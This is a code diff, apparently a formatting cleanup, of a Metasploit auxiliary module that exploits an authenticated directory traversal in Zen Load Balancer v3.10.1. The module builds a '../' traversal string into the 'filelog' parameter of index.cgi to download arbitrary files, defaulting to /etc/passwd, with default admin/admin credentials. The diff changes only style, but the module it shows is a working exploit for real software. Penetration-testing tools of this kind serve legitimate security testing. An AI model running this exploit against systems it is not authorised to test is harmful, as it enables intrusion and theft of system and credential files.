@@ -8,26 +8,29 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Zen Load Balancer Directory Traversal",
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Zen Load Balancer Directory Traversal',
+        'Description' => %q{
           This module exploits a authenticated directory traversal vulnerability in Zen Load
           Balancer `v3.10.1`. The flaw exists in 'index.cgi' not properly handling 'filelog='
           parameter which allows a malicious actor to load arbitrary file path.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Basim Alabdullah', # Vulnerability discovery
-          'Dhiraj Mishra'     # Metasploit module
-        ],
-      'References'     =>
-        [
-          ['EDB', '48308']
-        ],
-      'DisclosureDate' => "Apr 10 2020"
-    ))
+        },
+        'License' => MSF_LICENSE,
+        'Author' =>
+          [
+            'Basim Alabdullah', # Vulnerability discovery
+            'Dhiraj Mishra'     # Metasploit module
+          ],
+        'References' =>
+          [
+            ['EDB', '48308']
+          ],
+        'DisclosureDate' => '2020-04-10'
+      )
+    )
 
     register_options(
       [
@@ -35,28 +38,29 @@ class MetasploitModule < Msf::Auxiliary
         OptBool.new('SSL', [true, 'Use SSL', true]),
         OptInt.new('DEPTH', [true, 'The max traversal depth', 16]),
         OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/passwd']),
-        OptString.new('TARGETURI', [true, "The base URI path of the ZenConsole install", '/']),
+        OptString.new('TARGETURI', [true, 'The base URI path of the ZenConsole install', '/']),
         OptString.new('HttpUsername', [true, 'The username to use for the HTTP server', 'admin']),
         OptString.new('HttpPassword', [false, 'The password to use for the HTTP server', 'admin'])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
     filename = datastore['FILEPATH']
-    traversal = "../" * datastore['DEPTH']
+    traversal = '../' * datastore['DEPTH']
 
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'index.cgi'),
-      'vars_get'=>
+      'vars_get' =>
       {
-        'id'      => '2-3',
+        'id' => '2-3',
         'filelog' => "#{traversal}#{filename}",
-        'nlines'  => '100',
-        'action'  => 'See logs'
+        'nlines' => '100',
+        'action' => 'See logs'
       },
-      'authorization' => basic_auth(datastore['HttpUsername'],datastore['HttpPassword'])
-      }, 25)
+      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
+    }, 25)
 
     unless res && res.code == 200
       print_error('Nothing was downloaded')
